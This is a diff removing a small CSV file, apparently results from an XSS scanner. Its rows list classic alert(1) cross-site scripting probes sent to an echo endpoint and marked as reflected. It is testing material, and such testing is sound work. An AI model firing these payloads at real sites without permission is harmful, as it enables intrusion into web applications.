@@ -1,6 +1,0 @@
-param,payload,url,reflected,method
-q,<script>alert(1)</script>,https://postman-echo.com/post,True,POST-JSON
-q,"""><svg/onload=alert(1)>",https://postman-echo.com/post,True,POST-JSON
-q,<img src=x onerror=alert(1)>,https://postman-echo.com/post,True,POST-JSON
-q,<style>*{background:url(javascript:alert(1))}</style>,https://postman-echo.com/post,True,POST-JSON
-q,<body onresize=alert(1)>,https://postman-echo.com/post,True,POST-JSON
